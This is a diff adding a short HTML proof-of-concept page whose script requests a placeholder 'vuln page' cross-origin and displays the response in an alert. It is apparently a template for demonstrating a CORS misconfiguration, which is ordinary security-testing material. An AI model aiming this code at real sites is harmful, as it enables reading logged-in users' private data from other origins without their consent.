@@ -1,0 +1,22 @@
+<!DOCTYPE>
+<html>
+<script type="text/javascript">
+function loadXMLDoc()
+{
+    var xhr = new XMLHttpRequest();
+
+    xhr.onreadystatechange=function()
+    {
+        if(xhr.readyState == 4 && xhr.status == 200) //if receive xhr response
+        {
+            var datas=xhr.responseText;
+            alert(datas);
+        }
+    }
+    //request vuln page
+    xhr.open("GET","https://blahblah/","true") 
+    xhr.send();
+}
+loadXMLDoc();
+</script>
+</html>
